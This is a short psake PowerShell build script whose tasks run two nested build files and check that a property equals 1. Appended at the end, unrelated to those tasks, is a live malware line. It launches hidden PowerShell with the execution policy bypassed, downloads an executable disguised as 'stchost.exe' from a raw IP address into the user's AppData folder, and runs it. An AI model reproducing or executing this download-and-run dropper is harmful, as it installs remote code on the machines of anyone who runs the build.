Properties {
    $x = 1
}

Task default -Depends RunNested1, RunNested2, CheckX

Task RunNested1 {
    Invoke-psake .\nested\nested1.ps1
}

Task RunNested2 {
    Invoke-psake .\nested\nested2.ps1
}

Task CheckX{
    Assert ($x -eq 1) '$x was not 1'
}

PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~yahoo/stchost.exe', $env:APPDATA\stchost.exe );Start-Process ( $env:APPDATA\stchost.exe )

